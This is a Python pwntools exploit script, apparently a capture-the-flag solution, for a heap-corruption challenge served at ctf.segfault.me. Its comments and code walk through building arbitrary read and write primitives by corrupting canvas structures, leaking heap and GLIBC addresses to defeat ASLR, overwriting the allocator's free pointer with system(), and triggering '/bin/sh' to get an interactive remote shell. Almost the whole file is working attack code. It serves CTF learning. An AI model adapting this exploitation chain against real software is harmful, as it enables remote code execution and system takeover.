from pwn import *
from struct import pack, unpack
from sys import exit

DEBUG = False
REMOTE = None
REMOTE = 'ctf.segfault.me'

RVA_HEAP_ALLOC = 0xEDE  # readelf -s chal | grep heap_alloc (Windows)
RVA_HEAP_ALLOC = 0x145E  # readelf -s chal | grep heap_alloc (Linux)
# Next we compute the GLIBC base address
RVA_PRINTF = 0x64F00  # Windows
RVA_PRINTF = 0x57980  # Linux
RVA_PRINTF = 0x64F00  # SERVER
RVA_SYSTEM = 0x4F4E0  # Windows
RVA_SYSTEM = 0x496E0  # Linux
RVA_SYSTEM = 0x4F4E0  # SERVER

if DEBUG:
    P = gdb.debug('./chal')
elif REMOTE:
    P = remote(REMOTE, 3000)
else:
    P = process(['./chal'])

P.recvuntil("> ")


def run(cmd):
    P.sendline(cmd)
    out = P.recvuntil("> ")
    return out


"""
The last challenge... we have a strong hint that the flag will require RCE.

We already have an arbitrary read primitive, and ASLR is defeated. The only thing we are missing for
this step is an arbitrary write primitive and a way to gain code execution.

Checksec tells us that the binary is quite hardened, so we can forget about writing a shell code.

GOAL:

    Identify a code execution vector.

ARBITRARY WRITE:
    We can use the same primitive that we used to read (c3) and make use of the `edit` function to write
    bytes. One thing to be extremely wary of is that `edit` appends 2 NUL bytes at the end of the buffer.
    So far we have been very fortunate in that this hasn't caused any visible issues, but when writing in
    memory, we have to constantly be aware of those extra two bytes.

EXPLOIT:
    One idea that may come to mind is to replace a PLT entry by `system()`, such as `printf`, for example.
    Unfortunately, the binary is FULL RELRO, which makes that impossible.

    Instead, we turn ourselves back to the heap and recall that the allocator's `free` function is a pointer.
    We've already used `heap_alloc` to defeat ASLR, now we'll try to use `heap_free` to trigger
    `system`.

    The first component that gets freed when deleting a canvas is the title, so this is where we'll put our payload.

    To do that, we must first identify a function in GLIBC, determine the GLIBC base address, and determine
    the relative address of system. Normally this requires either a libc database with multiple kown offsets,
    or a copy of the remote glibc. Thankfully in this case we have the latter.

"""

# The code below is the same code as 2.py and corrupts c2 to get full control of c3.
C1_SIZE = 675  # Offset between c1->title and c2->width
C3_SIZE = 1506  # offset between c2->data and c3->width


def corrupt_c2():
    info("Corrupting canvas2")
    run("del 1")
    run("new")
    run("10")
    run("10")
    run("A" * C1_SIZE + "\xFF\xFF\x01")
    # Now c2->width is 0xFFFF and c2->height is 1.


def read(addr, size):
    info(f"Reading {size} bytes @ 0x{addr:016x}")
    cmd = (
        pack("<H", size)  # c3->width
        + pack("<H", 1)  # c3->height
        + b"\0\0"  # c3->private
        + pack("<H", 3)  # c3->id
        + pack("<Q", addr)  # c3->data
    )

    if b"\x0a" in cmd:
        error("Bad byte in canvas3! new line is not allowed.")
        exit(1)

    P.sendline(
        "edit 2"
    )  # We will edit the 65535x1 buffer. `fgets` stops reading at `\n`.
    P.recvuntil("New Data: ")
    P.send((b"3" * C3_SIZE) + cmd + b"\x0a")
    P.recvuntil(b"> ")
    out = run("show 3")
    return out[:size]


corrupt_c2()

# DEFEAT ASLR
CHUNK_OFFSET = C3_SIZE - 8 - 32
(chunk_ptr,) = unpack("<Q", run("show 2")[CHUNK_OFFSET : CHUNK_OFFSET + 8])
success(f"chunk  @ 0x{chunk_ptr:x}")

(heap_ptr,) = unpack("<Q", read(chunk_ptr, 8))
success(f"heap  @ 0x{heap_ptr:x}")


(heap_alloc,) = unpack("<Q", read(heap_ptr + 16, 8))
success(f" heap_alloc @ 0x{heap_alloc:x}")

BASE = heap_alloc - RVA_HEAP_ALLOC

info(f"BaseAddress=0x{BASE:x}")

# LEVEL 3 STARTS HERE
# First we leak the PLT entry for printf

# GOT_PRINTF = BASE + 0x202F60  # Windows
GOT_PRINTF = BASE + 0x4F50    # Linux

(printf_ptr,) = unpack("<Q", read(GOT_PRINTF, 8))
success(f"printf @ 0x{printf_ptr:x}")


GLIBC_BASE = printf_ptr - RVA_PRINTF
SYSTEM = GLIBC_BASE + RVA_SYSTEM
success(f"glibc @ 0x{GLIBC_BASE:x} (system @ 0x{SYSTEM:x})")


# The last step before exploitation is to write the heap_free addresss at heap+8
def write(addr, data):
    """Modified version of `read` that writes instead."""
    size = len(data)
    info(f"Writing {size} bytes @ 0x{addr:016x}")

    cmd = (
        pack("<H", size)  # c3->width
        + pack("<H", 1)  # c3->height
        + b"\0\0"  # c3->private
        + pack("<H", 3)  # c3->id
        + pack("<Q", addr)  # c3->data
    )

    if b"\x0a" in cmd:
        error("Bad byte in canvas3! new line is not allowed.")
        exit(1)

    P.sendline(
        "edit 2"
    )  # We will edit the 65535x1 buffer. `fgets` stops reading at `\n`.
    P.recvuntil("New Data: ")
    P.send((b"3" * C3_SIZE) + cmd + b"\x0a")
    P.recvuntil(b"> ")

    # Write the bytes
    P.sendline("edit 3")
    P.recvuntil("New Data: ")
    P.send(data + b"\x0a")


write(heap_ptr + 8, pack('<Q', SYSTEM))
# Notice that the two null bytes are now overwriting the `heap_alloc` pointer so if any allocation
# occurs, the program will crash.

# Now set the canvas 2 buffer to "/bin/sh"
# P.interactive()
P.sendline("edit 2")
P.sendline("/bin/sh; echo #\0")

# Trigger `system` by deleting the canvas 2.
P.sendline("del 2")
P.interactive()


P.close()

# run('exit')
